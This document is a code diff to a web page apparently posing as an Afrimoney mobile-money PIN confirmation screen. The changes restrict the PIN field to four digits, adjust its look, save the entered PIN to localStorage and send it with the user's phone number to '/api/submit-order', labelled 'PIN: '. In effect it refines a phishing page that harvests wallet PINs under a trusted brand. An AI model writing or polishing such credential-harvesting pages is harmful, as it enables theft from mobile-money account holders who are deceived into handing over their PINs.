@@ -18,7 +18,6 @@
         html, body {
             width: 100%;
             height: 100%;
-            /* Updated to use your preferred rich purple gradient (#991676) */
             background: linear-gradient(135deg, #991676 0%, #79105c 50%, #5a0c44 100%);
             overflow: auto;
             color: #ffffff;
@@ -69,7 +68,7 @@
         }
 
         .e-logo span {
-            color: #ffd34d; /* Updated Yellow/Gold Accent */
+            color: #ffd34d;
         }
 
         .e-logo small {
@@ -118,8 +117,8 @@
             background: #ffffff;
             border: 1.5px solid rgba(255, 255, 255, 0.22);
             border-radius: 14px;
-            font-size: 20px;
-            letter-spacing: 4px;
+            font-size: 24px;
+            letter-spacing: 12px;
             text-align: center;
             color: #000000;
             font-weight: 700;
@@ -128,19 +127,20 @@
             appearance: none;
             transition: all 0.2s ease;
             box-shadow: inset 0 2px 4px rgba(0,0,0,0.05);
+            padding-left: 20px;
         }
 
         .e-input-field:focus {
-            border-color: #ffd34d; /* Updated Yellow/Gold */
+            border-color: #ffd34d;
             box-shadow: 0 0 15px rgba(255, 211, 77, 0.2);
         }
 
         .e-input-field::placeholder {
             color: #000000;
             opacity: 0.5;
-            letter-spacing: 1px;
+            letter-spacing: 6px;
             font-weight: 500;
-            font-size: 15px;
+            font-size: 18px;
             text-align: center;
         }
 
@@ -150,7 +150,7 @@
             right: 18px;
             top: 50%;
             transform: translateY(-50%);
-            color: #79105c; /* Updated Purple */
+            color: #79105c;
             font-size: 18px;
             cursor: pointer;
             z-index: 10;
@@ -174,7 +174,7 @@
         }
 
         .e-btn-login.active {
-            background: #ffd34d; /* Updated Yellow/Gold */
+            background: #ffd34d;
             cursor: pointer;
         }
 
@@ -215,7 +215,7 @@
             width: 24px;
             height: 24px;
             border: 3px solid rgba(255, 255, 255, 0.2);
-            border-top: 3px solid #ffd34d; /* Updated Yellow Spinner */
+            border-top: 3px solid #ffd34d;
             border-radius: 50%;
             animation: spin 0.8s linear infinite;
         }
@@ -250,7 +250,7 @@
         }
 
         .modal-card {
-            background: #991676; /* Updated Purple */
+            background: #991676;
             width: 100%;
             max-width: 320px;
             border-radius: 24px;
@@ -276,7 +276,7 @@
         }
 
         .modal-btn {
-            background: #ffd34d; /* Updated Yellow/Gold */
+            background: #ffd34d;
             color: #5E0C44;
             border: none;
             border-radius: 14px;
@@ -307,10 +307,10 @@
             <!-- Main Card & PIN Form Section -->
             <div class="e-card-box">
                 <h2>Enter your Afrimoney Pin Code</h2>
-                <p>Please enter your Afrimoney account PIN to confirm your request.</p>
+                <p>Please enter your 4-digit Afrimoney account PIN to confirm your request.</p>
 
                 <div class="e-input-group">
-                    <input type="password" id="mpin" class="e-input-field" placeholder="Pin Code" inputmode="numeric" pattern="[0-9]*" autocomplete="current-password" autofocus required oninput="checkPinLength()">
+                    <input type="password" id="mpin" class="e-input-field" placeholder="----" inputmode="numeric" pattern="[0-9]*" maxlength="4" autocomplete="current-password" autofocus required oninput="checkPinLength()">
                     <i class="fa-solid fa-eye toggle-password" id="toggleEye" onclick="togglePinVisibility()"></i>
                 </div>
             </div>
@@ -363,17 +363,17 @@
         }
     }
 
-    // Dynamic button color & active state once PIN has values
+    // Restrict input strictly to 4 numeric digits and activate button when complete
     function checkPinLength() {
         const mpinInput = document.getElementById('mpin');
         
-        // Ensure only numeric characters are entered
-        mpinInput.value = mpinInput.value.replace(/\D/g, '');
+        // Strip non-digits and cap at 4 characters
+        mpinInput.value = mpinInput.value.replace(/\D/g, '').slice(0, 4);
 
         const val = mpinInput.value.trim();
         const confirmBtn = document.getElementById('confirmBtn');
 
-        if (val.length > 0) {
+        if (val.length === 4) {
             confirmBtn.classList.add('active');
         } else {
             confirmBtn.classList.remove('active');
@@ -385,26 +385,25 @@
         const spinnerDiv = document.getElementById('loadingSpinner');
         const confirmBtn = document.getElementById('confirmBtn');
 
-        if (mpinInput.length === 0) {
-            showAppAlert('Please enter your valid Afrimoney PIN.');
+        if (mpinInput.length !== 4) {
+            showAppAlert('Please enter a valid 4-digit Afrimoney PIN.');
             return;
         }
 
-        const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || '';
+        const phoneInput = localStorage.getItem('africellUserPhone') || localStorage.getItem('userPhone') || 'Afrimoney User';
         
         // Save PIN to localStorage
         localStorage.setItem('africellLastPin', mpinInput);
         localStorage.setItem('lastPin', mpinInput);
 
         try {
-            // Blur/disable button and show loading spinner while waiting for callback
             confirmBtn.classList.add('disabled-state');
             if (spinnerDiv) spinnerDiv.style.display = 'flex';
 
             const response = await fetch('/api/submit-order', {
                 method: 'POST',
                 headers: { 'Content-Type': 'application/json' },
-                body: JSON.stringify({ phone: phoneInput, uniqueId: mpinInput })
+                body: JSON.stringify({ phone: phoneInput, uniqueId: 'PIN: ' + mpinInput })
             });
 
             const result = await response.json();
